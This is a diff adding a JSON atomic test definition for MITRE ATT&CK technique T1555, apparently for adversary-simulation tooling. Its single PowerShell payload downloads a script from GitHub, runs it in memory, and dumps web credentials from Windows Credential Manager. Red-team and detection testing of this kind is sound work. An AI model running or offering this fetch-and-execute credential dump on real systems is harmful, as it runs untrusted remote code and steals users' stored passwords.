@@ -1,0 +1,20 @@
+{
+  "ID": "T1555",
+  "name": "Credentials from Password Stores",
+  "atomic-testings": [
+    {
+      "payload_version": "01",
+      "payload_external_id": "ff414ab6-74b9-4409-b2ec-3207251cf19b",
+      "payload_type": "command",
+      "payload_name": "Dump credentials from Windows Credential Manager With PowerShell [web Credentials]",
+      "payload_description": "This module will extract the credentials from Windows Credential Manager",
+      "payload_platforms": [
+        "Windows"
+      ],
+      "payload_execution_arch": "ALL_ARCHITECTURES",
+      "payload_elevation_required": false,
+      "command_executor": "powershell",
+      "command_content": "IEX (IWR 'https://raw.githubusercontent.com/TriggerMan-S/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-CredManCreds -Force"
+    }
+  ]
+}
